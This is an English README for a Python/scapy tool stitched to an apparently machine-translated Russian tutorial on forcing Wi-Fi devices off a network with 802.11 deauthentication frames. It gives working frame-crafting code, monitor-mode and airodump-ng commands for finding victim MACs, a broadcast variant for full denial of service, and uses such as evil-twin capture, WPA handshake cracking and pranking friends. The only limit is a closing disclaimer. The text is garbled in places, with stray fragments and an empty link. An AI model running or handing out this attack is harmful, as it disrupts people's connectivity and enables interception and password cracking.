# [Forcing a device to disconnect using scapy in Python](https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy)
to run this:
- Linux Machine.
- USB WLAN Stick.
- aircrack-ng.
- Turn the network interface to Monitor mode using the command:
    ```
    airmon-ng start wlan0
    ```
- `pip3 install -r requirements.txt`.
- 
    ```
    python3 scapy_deauth.py --help
    ```
    **Output**:
    ```
    usage: scapy_deauth.py [-h] [-c COUNT] [--interval INTERVAL] [-i IFACE] [-v]
                         target gateway

    A python script for sending deauthentication frames

    positional arguments:
    target                Target MAC address to deauthenticate.
    gateway               Gateway MAC address that target is authenticated with

    optional arguments:
    -h, --help            show this help message and exit
    -c COUNT, --count COUNT
                            number of deauthentication frames to send, specify 0
                            to keep sending infinitely, default is 0
    --interval INTERVAL   The sending frequency between two frames sent, default
                            is 100ms
    -i IFACE              Interface to use, must be in monitor mode, default is
                            'wlan0mon'
    -v, --verbose         wether to print messages
    ```
    For instance, if you want to deauthenticate `"00:ae:fa:81:e2:5e"` on an access point `"e8:94:f6:c4:97:3f"`, you can easily by:
    ```
    python3 scapy_deauth.py 00:ae:fa:81:e2:5e e8:94:f6:c4:97:3f -i wlan0mon -v
    ```
##
# [[] / []]()
В этом уроке мы увидим, как мы можем выгнать устройства из определенной сети, к которой вы на самом деле не принадлежите в Python с помощью Scapy, это можно сделать, отправив кадры деаутентификации в воздухе с помощью сетевого устройства, которое находится в режиме мониторинга.

Злоумышленник может в любое время отправить кадры деаутентификации на беспроводную точку доступа с поддельным MAC-адресом жертвы, в результате чего точка доступа деаутентифицируется с этим пользователем. Как вы можете догадаться, протокол не требует никакого шифрования для этого кадра, злоумышленнику нужно только знать MAC-адрес жертвы, который легко захватить с помощью утилит типа airodump-ng.

Проверьте и это: Как создать прослушиватель DHCP с помощью Scapy в Python.

Давайте импортируем Scapy (вам нужно сначала установить его, перейдите к этому руководству или официальной документации Scapy для установки):

from scapy.all import *
К счастью, у Scapy есть пакетный класс Dot11Deauth(), который делает именно то, что мы ищем. В качестве параметра требуется код причины 802.11, и мы выберем значение 7 на данный момент (которое является кадром, полученным от несвязанной станции, как упомянуто здесь).

Давайте создадим пакет:

target_mac = "00:ae:fa:81:e2:5e"
gateway_mac = "e8:94:f6:c4:97:3f"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
Связанные с: Создание 24 этических хакерских скриптов и инструментов с помощью Python Book

Это в основном точка доступа, запрашивающая деаутентификацию от цели; Вот почему мы устанавливаем MAC-адрес назначения на MAC-адрес оконечного устройства, а исходный MAC-адрес на MAC-адрес точки доступа, а затем отправляем стекированный кадр 100 раз каждые 0,1 секунды, это вызовет деаутентификацию в течение 10 секунд.

Вы также можете установить "ff:ff:ff:ff:ff:ff" (широковещательный MAC-адрес) как addr1 (target_mac), и это приведет к полному отказу в обслуживании, так как ни одно устройство не может подключиться к этой точке доступа. Это довольно вредно!

Теперь, чтобы запустить это, вам нужна машина Linux и сетевой интерфейс, который находится в режиме монитора. Чтобы включить режим монитора в сетевом интерфейсе, вы можете использовать утилиты Linux iwconfig или airmon-ng (после установки aircrack-ng):

$ sudo ifconfig wlan0 down
$ sudo iwconfig wlan0 mode monitor
Мрх

$ sudo airmon-ng start wlan0
Мой сетевой интерфейс называется wlan0, но вы должны использовать правильное имя сетевого интерфейса.

Теперь вы, возможно, задаетесь вопросом, как мы можем получить шлюз и целевой MAC-адрес, если мы не подключены к этой сети? это хороший вопрос. Когда вы переводите свою сетевую карту в режим монитора, вы можете фактически обнаруживать пакеты в воздухе, используя эту команду в Linux (при установке aircrack-ng):

$ airodump-ng wlan0mon
Примечание: wlan0mon - это имя моего сетевого интерфейса в режиме монитора. Вы можете проверить имя сетевого интерфейса с помощью утилиты iwconfig Linux.

Эта команда будет продолжать перехватывать кадры маяка 802.11 и упорядочивать сети Wi-Fi для вас, а также близлежащие подключенные к нему устройства.

Прежде чем мы выполним сценарий, телефон Android моей жертвы (который имеет MAC-адрес «00:ae:fa:81:e2:5e») обычно подключен к точке доступа Wi-Fi (которая имеет MAC-адрес «e8:94:f6:c4:97:3f»):

Подключенное устройствоТеперь выполним скрипт:

Выполнение атаки деаутентификацииВозвращаясь к устройству жертвы:

Отключенное устройство после атаки деаутентификации

Как видите, мы провели успешную атаку по деаутентификации! Вы можете передать -c 0 (по умолчанию), чтобы предотвратить его подключение до тех пор, пока вы не остановите выполнение!

Я настоятельно рекомендую вам проверить завершенную версию кода, использующего аргументы командной строки, как показано на рисунках.

Вам может быть интересно, почему это полезно? Ну, давай, посмотрим:

Одной из основных целей атаки деаутентификации является принуждение клиентов к двойной точке доступа Evil, которая может быть использована для захвата сетевых пакетов, передаваемых между клиентом и точкой доступа Rogue.
Также может быть полезно захватить 4-стороннее рукопожатие WPA. Затем злоумышленнику необходимо взломать пароль WPA.
Вы также можете шутить со своими друзьями!
СВЯЗАННЫЕ С: Как создать поддельные точки доступа с помощью Scapy в Python.

Наконец, в нашей книге Ethical Hacking with Python мы создаем 24 хакерских инструмента и скрипта с нуля с помощью Python! Проверьте это здесь, если вам интересно.

Отказ: Не используйте это в сети, на которую у вас нет разрешения, мы не несем никакой ответственности. Этот учебник предназначен для образовательных целей!